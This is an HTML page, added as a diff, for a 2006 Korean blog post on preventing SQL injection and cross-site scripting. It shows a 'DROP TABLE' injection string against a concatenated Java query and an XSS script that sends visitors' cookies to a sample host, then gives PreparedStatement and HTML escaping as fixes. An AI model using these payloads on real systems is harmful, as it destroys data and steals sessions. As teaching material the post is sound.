@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html id="R-html" lang="ko-KR" dir="ltr" itemscope itemtype="http://schema.org/Article" data-r-output-format="print">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.152.2">
+    <meta name="generator" content="Relearn 9.0.3+36307e4ed23582638ab689240ac7b427217803ee">
+    <meta name="description" content="&lt; Sql injection &gt;
+[공격 예제]
+Java 소스의 게시판 검색 Sql 구문 코딩이 아래와 같다고 하고
+String findQuery = “select * from notice where title = &#39;” &#43; keyword &#43; “&#39; “ ;
+ 
+홈페이지의 게시판 검색 시 keyword 에 “   any&#39;  ;  DROP TABLE NOTICE   “  를 넣고 검색한다면">
+    <meta name="author" content="">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Sql injection & Cross Site Scripting (XSS) 예방책 :: Do What You Want To Do">
+    <meta name="twitter:description" content="&lt; Sql injection &gt;
+[공격 예제]
+Java 소스의 게시판 검색 Sql 구문 코딩이 아래와 같다고 하고
+String findQuery = “select * from notice where title = &#39;” &#43; keyword &#43; “&#39; “ ;
+ 
+홈페이지의 게시판 검색 시 keyword 에 “   any&#39;  ;  DROP TABLE NOTICE   “  를 넣고 검색한다면">
+    <meta property="og:url" content="https://bluedskim.github.io/posts/software-engineering/sql-injection--cross-site-scripting-xss-%EC%98%88%EB%B0%A9%EC%B1%85/index.html">
+    <meta property="og:site_name" content="Do What You Want To Do">
+    <meta property="og:title" content="Sql injection & Cross Site Scripting (XSS) 예방책 :: Do What You Want To Do">
+    <meta property="og:description" content="&lt; Sql injection &gt;
+[공격 예제]
+Java 소스의 게시판 검색 Sql 구문 코딩이 아래와 같다고 하고
+String findQuery = “select * from notice where title = &#39;” &#43; keyword &#43; “&#39; “ ;
+ 
+홈페이지의 게시판 검색 시 keyword 에 “   any&#39;  ;  DROP TABLE NOTICE   “  를 넣고 검색한다면">
+    <meta property="og:locale" content="ko_KR">
+    <meta property="og:type" content="article">
+    <meta property="article:section" content="Posts">
+    <meta property="article:published_time" content="2006-08-29T18:56:00+09:00">
+    <meta property="article:modified_time" content="2006-08-29T18:56:00+09:00">
+    <meta property="article:tag" content="Sql">
+    <meta property="article:tag" content="Injection">
+    <meta itemprop="name" content="Sql injection & Cross Site Scripting (XSS) 예방책 :: Do What You Want To Do">
+    <meta itemprop="description" content="&lt; Sql injection &gt;
+[공격 예제]
+Java 소스의 게시판 검색 Sql 구문 코딩이 아래와 같다고 하고
+String findQuery = “select * from notice where title = &#39;” &#43; keyword &#43; “&#39; “ ;
+ 
+홈페이지의 게시판 검색 시 keyword 에 “   any&#39;  ;  DROP TABLE NOTICE   “  를 넣고 검색한다면">
+    <meta itemprop="datePublished" content="2006-08-29T18:56:00+09:00">
+    <meta itemprop="dateModified" content="2006-08-29T18:56:00+09:00">
+    <meta itemprop="wordCount" content="216">
+    <meta itemprop="keywords" content="Sql,Injection">
+    <title>Sql injection &amp; Cross Site Scripting (XSS) 예방책 :: Do What You Want To Do</title>
+    <link href="https://bluedskim.github.io/posts/software-engineering/sql-injection--cross-site-scripting-xss-%EC%98%88%EB%B0%A9%EC%B1%85/index.html" rel="canonical" type="text/html" title="Sql injection &amp; Cross Site Scripting (XSS) 예방책 :: Do What You Want To Do">
+    <link href="/css/auto-complete/auto-complete.min.css?1774431351" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1774431351" defer></script>
+    <script src="/js/search-lunr.min.js?1774431351" defer></script>
+    <script src="/js/search.min.js?1774431351" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.index_js_url="/searchindex.en.js?1774431351";
+    </script>
+    <script src="/js/lunr/lunr.min.js?1774431351" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1774431351" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1774431351" defer></script>
+    <script src="/js/lunr/lunr.ko.min.js?1774431351" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.contentLangs=['ko'];
+    </script>
+    <link href="/fonts/fontawesome/css/all.min.css?1774431351" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1774431351" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1774431351" rel="stylesheet">
+    <link href="/css/theme.min.css?1774431351" rel="stylesheet">
+    <link href="/css/format-print.min.css?1774431351" rel="stylesheet" id="R-format-style">
+    <script>
+      window.relearn = window.relearn || {};
+      // configuration
+      window.relearn.min = `.min`;
+      window.relearn.path='\/posts\/software-engineering\/sql-injection--cross-site-scripting-xss-%EC%98%88%EB%B0%A9%EC%B1%85\/index.html';
+      window.relearn.relBasePath='..\/..\/..';
+      window.relearn.relBaseUri='..\/..\/..';
+      window.relearn.absBaseUri='https:\/\/bluedskim.github.io';
+      window.relearn.disableInlineCopyToClipboard=false;
+      window.relearn.enableBlockCodeWrap=true;
+      // translations
+      window.T_Copy_to_clipboard = `Copy text to clipboard`;
+      window.T_Copied_to_clipboard = `Text copied to clipboard!`;
+      window.T_Link_copied_to_clipboard = `Link copied to clipboard!`;
+      window.T_Reset_view = `Reset view`;
+      window.T_View_reset = `View reset!`;
+      window.T_No_results_found = `No results found for "{0}"`;
+      window.T_N_results_found = `{1} results found for "{0}"`;
+      window.T_Browser_unsupported_feature = `This browser doesn't support this feature`;
+      // variant stuff
+      window.relearn.themevariants = [ 'relearn-auto', 'learn' ];
+      window.relearn.customvariantprefix = "my-custom-";
+      window.relearn.changeVariant = function(variant) {
+        var oldVariant = document.documentElement.dataset.rThemeVariant;
+        window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        document.documentElement.dataset.rThemeVariant = variant;
+        if (oldVariant != variant) {
+          document.dispatchEvent( new CustomEvent('themeVariantLoaded', { detail: { variant, oldVariant } }) );
+          window.relearn.markVariant();
+        }
+      }
+      window.relearn.markVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant");
+        document.querySelectorAll(".R-variantswitcher select").forEach((select) => {select.value = variant;});
+      }
+      window.relearn.initVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant") ?? "";
+        if( !variant ||
+            (!variant.startsWith(window.relearn.customvariantprefix) && !window.relearn.themevariants.includes(variant)) ||
+            (variant.startsWith(window.relearn.customvariantprefix) && !window.localStorage.getItem(window.relearn.absBaseUri + "/variantstylesheet-" + variant)) ){
+          variant = window.relearn.themevariants[0];
+          window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        }
+        document.documentElement.dataset.rThemeVariant = variant;
+      }
+      window.relearn.initVariant();
+      window.relearn.markVariant();
+    </script>
+  </head>
+  <body class="mobile-support print" data-origin="/posts/software-engineering/sql-injection--cross-site-scripting-xss-%EC%98%88%EB%B0%A9%EC%B1%85/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar" class="default-animation">
+        <div class="topbar-wrapper default-animation">
+          <div class="topbar-sidebar-divider default-animation"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar default-animation" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button></span>
+            </div>
+            <div class="topbar-button topbar-button-toc default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-table-list"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper"> 
+                </div>
+              </div>
+            </div>
+          </div>
+          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Do What You Want</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/posts/index.html"><span itemprop="name">Posts</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">Sql injection &amp; Cross Site Scripting (XSS) 예방책</span><meta itemprop="position" content="3"></li>
+          </ol>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-print default-animation" data-content-empty="disable" data-width-s="area-more" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/posts/software-engineering/sql-injection--cross-site-scripting-xss-%EC%98%88%EB%B0%A9%EC%B1%85/index.print.html" title="Print whole chapter (CTRL+ALT+p)"><i class="fa-fw fas fa-print"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-prev default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/posts/software-engineering/%EC%B6%94%EC%96%B5%EC%9D%98-ip/index.html" title="추억의 IP (🡐)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-next default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/posts/software-engineering/ruby-%EC%96%B8%EC%96%B4%EC%9A%A9-%EC%9B%B9-%EC%9D%B8%ED%84%B0%ED%94%84%EB%A6%AC%ED%84%B0/index.html" title="Ruby 언어용 웹 인터프리터 (🡒)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-more default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable posts" tabindex="-1">
+        <div class="flex-block-wrapper">
+<article class="default">
+  <header class="headline">
+<div class="R-taxonomy taxonomy-tags cstyle tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
+  <i class="fa-fw fas fa-layer-group"></i>
+  <ul>
+    <li><a class="term-link" href="/tags/injection/index.html">Injection</a></li>
+    <li><a class="term-link" href="/tags/sql/index.html">Sql</a></li>
+  </ul>
+</div>
+  </header>
+
+<h1 id="sql-injection--cross-site-scripting-xss-예방책">Sql injection &amp; Cross Site Scripting (XSS) 예방책</h1>
+
+<p><span class="copyright_entry" style="display:block;" title="Sql injection &amp; Cross Site Scripting (XSS) 예방책@@**@@http://shed.egloos.com/1401958"></span></p>
+<p class="MsoNormal" style=""><b style=""><span style="font-family: 굴림체;" lang="EN-US">&lt; Sql injection&nbsp;&gt;</span></b></p> 
+<p class="MsoNormal" style=""><b style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">[</span></b><b style=""><span style="font-size: 10pt; font-family: 굴림체;">공격 예제<span lang="EN-US">]</span></span></b></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">Java </span><span style="font-size: 10pt; font-family: 굴림체;">소스의 게시판 검색 <span lang="EN-US">Sql </span>구문 코딩이 아래와 같다고 하고<span lang="EN-US"></span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">String findQuery = </span><span style="font-size: 10pt;">“<span lang="EN-US">select * from notice where <b style="">title = '</b></span><b style="">”<span lang="EN-US"> + keyword + </span>“<span lang="EN-US">' </span>“</b><span lang="EN-US"> ;</span></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">홈페이지의 게시판 검색 시 <span style="" lang="EN-US">keyword</span><span lang="EN-US"> </span>에<span lang="EN-US"> <br> <br> </span></span><span style="font-size: 10pt;">“<span lang="EN-US"><span style="">&nbsp;&nbsp; </span>any' <span style="">&nbsp;</span>;<span style="">&nbsp; </span>DROP TABLE NOTICE<span style="">&nbsp;&nbsp; </span></span>“</span><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US"><span style="">&nbsp; </span></span><span style="font-size: 10pt; font-family: 굴림체;">를 넣고 검색한다면 <span lang="EN-US"></span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">아래와 같은 <span lang="EN-US">Sql </span>구문이 실행되고<span lang="EN-US"></span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">SELECT * FROM notice WHERE title = 'any' ;<span style="">&nbsp; </span><b style="">DROP TABLE notice</b></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">NOTICE </span><span style="font-size: 10pt; font-family: 굴림체;">테이블이 삭제됩니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
+<p class="MsoNormal" style=""><b style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">[</span></b><b style=""><span style="font-size: 10pt; font-family: 굴림체;">예방법<span lang="EN-US">]</span></span></b></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">Sql </span><span style="font-size: 10pt; font-family: 굴림체;">구문을 직접 생성하는 방법을 피하면 됩니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">Java</span><span style="font-size: 10pt; font-family: 굴림체;">의 경우<span lang="EN-US"> Prepared Statement </span>를 이용하면 예방가능합니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">--------------------------------------------------------------------------</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">String findQuery = </span><span style="font-size: 10pt;">“<span lang="EN-US">select * from notice where title = ? </span></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US">“</span><span style="font-size: 10pt;" lang="EN-US">;</span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">PreparedStatement pstmt = dbConnection.prepareStatement(findQuery);</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">pstmt.setString(1, keyword);</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">ResultSet rs = pstmt.executeQuery();</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">-----------------------------------------------------------------------</span></p> 
+<p class="MsoNormal" style="margin-left: 40pt; text-align: justify; text-indent: -20pt;"><span style="font-size: 10pt; font-family: Wingdings;" lang="EN-US"><span style="">l<span style="font-family: &amp;quot;Times New Roman&amp;quot;; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-size: 10pt;">참고<span lang="EN-US"> URL <br> http://korea.internet.com/channel/content.asp?kid=18&amp;cid=185&amp;nid=34414</span></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
+<p class="MsoNormal" style=""><b style=""><span style="font-family: 굴림체;" lang="EN-US">&lt; Cross Site Scripting&nbsp;(XSS) &gt;<span style="">&nbsp;&nbsp;&nbsp;&nbsp; </span></span></b></p> 
+<p class="MsoNormal" style=""><b style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">[</span></b><b style=""><span style="font-size: 10pt; font-family: 굴림체;">공격 예제<span lang="EN-US">]</span></span></b></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">아래의 코드가 웹페이지에 삽입되어 있다면<span lang="EN-US"></span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">----------------------------------------------------------------</span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">&lt;script&gt;</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">document.location.replace('http://10.1.1.1:8080/</span><span style="font-size: 10pt;" lang="EN-US"> <span style="">getCookie.cgi?'+document.cookie+'&amp;'+document.URL);</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">&lt;/script&gt;</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">---------------------------------------------------------------</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">페이지를 접속하는 순간에 사용자의 쿠기값들과 현재 페이지<span lang="EN-US"> URL</span>을 </span><span style="font-size: 10pt;" lang="EN-US"><a href="http://10.1.1.1:8080/getCookie.cgi"><span style="font-family: 굴림체;">http://10.1.1.1:8080/getCookie.cgi</span></a></span><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US"> </span><span style="font-size: 10pt; font-family: 굴림체;">로 전송합니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">위의 예 이외에도 여러가지 유형이 있습니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
+<p class="MsoNormal" style=""><b style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">[</span></b><b style=""><span style="font-size: 10pt; font-family: 굴림체;">예방법<span lang="EN-US">]</span></span></b></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">대부분의<span lang="EN-US"> XSS</span>는 게시판을 통해서 일어나므로<span lang="EN-US"></span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">사용자들 게시판에<span lang="EN-US"> html </span>코드를 쓸 수 없게 합니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">이 때<span lang="EN-US"> DB</span>에 게시물을<span lang="EN-US"> Insert </span>시에는 처리할 것이 없습니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">DB</span><span style="font-size: 10pt; font-family: 굴림체;">에서 해당 게시물을 조회할 때<span lang="EN-US"></span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">게시물 내용에서<span lang="EN-US"><span style="">&nbsp; </span></span>“<span lang="EN-US"> &lt; </span>“<span lang="EN-US"><span style="">&nbsp; </span></span>는<span lang="EN-US"><span style="">&nbsp; </span>&amp;lt;<span style="">&nbsp; </span></span>로 변경 하고<span lang="EN-US"><span style="">&nbsp;&nbsp;&nbsp; </span></span>”<span lang="EN-US"> &gt; </span>“ 는<span lang="EN-US"><span style="">&nbsp; </span>&amp;gt; </span>로 변경 해주면 웹브라우져는 악의적인 코드를<span lang="EN-US"> html</span>태그로 인식하지 않으므로 스크립트가 실행되지 않습니다<span lang="EN-US">(</span>화면에는 입력한 대로 출력되어 보이게 됩니다<span lang="EN-US">).</span></span></p> 
+<p class="MsoNormal" style="margin-left: 40pt; text-align: justify; text-indent: -20pt;"><span style="font-size: 10pt; font-family: Wingdings;" lang="EN-US"><span style="">l<span style="font-family: &amp;quot;Times New Roman&amp;quot;; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-size: 10pt;">참고<span lang="EN-US"> URL<br> http://www.zdnet.co.kr/builder/system/security/0,39031673,39131781,00.htm</span></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">&nbsp;</span></p> 
+<!--
+       <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+		    xmlns:dc="http://purl.org/dc/elements/1.1/"
+		    xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
+       <rdf:Description
+	        rdf:about="http://shed.egloos.com/1401958"
+	        dc:identifier="http://shed.egloos.com/1401958"
+	        dc:title="Sql injection &amp; Cross Site Scripting (XSS) 예방책"
+	        trackback:ping="http://shed.egloos.com/tb/1401958"/>
+       </rdf:RDF>
+       -->
+<ul></ul>
+  <footer class="footline">
+              <i class='fa-fw fas fa-calendar'></i> 2006-08-29
+<div class="R-taxonomy taxonomy-categories cstyle" title="Categories" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
+  <i class="fa-fw fas fa-layer-group"></i>
+  <ul>
+    <li><a class="term-link" href="/categories/software-engineering/index.html">Software Engineering</a></li>
+  </ul>
+</div>
+  </footer>
+</article>
+        </div>
+      </main>
+    </div>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1774431351" defer></script>
+    <script src="/js/theme.min.js?1774431351" defer></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-3QTEZE6PDE"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-3QTEZE6PDE');
+</script>
+    <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
+  </body>
+</html>
